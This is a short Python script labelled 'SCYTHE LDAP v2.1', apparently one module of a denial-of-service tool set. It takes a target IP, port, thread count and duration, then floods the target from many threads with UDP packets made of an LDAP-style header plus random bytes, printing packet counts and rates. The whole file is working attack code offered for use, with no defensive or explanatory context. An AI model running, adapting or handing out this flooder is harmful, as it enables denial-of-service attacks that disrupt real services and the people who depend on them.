# SCYTHE LDAP v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 5: print('Usage: python3 ldap.py <ip> <port> <threads> <time>'); sys.exit(1)
ip, port, threads, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
print(f'[SCYTHE] LDAP: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.sendto(b'\x30\x84' + random._urandom(1000), (ip, port))
      s.close();
      with lock: total += 1
    except: pass
for _ in range(threads):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[LDAP] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[LDAP] Completed: {total} packets')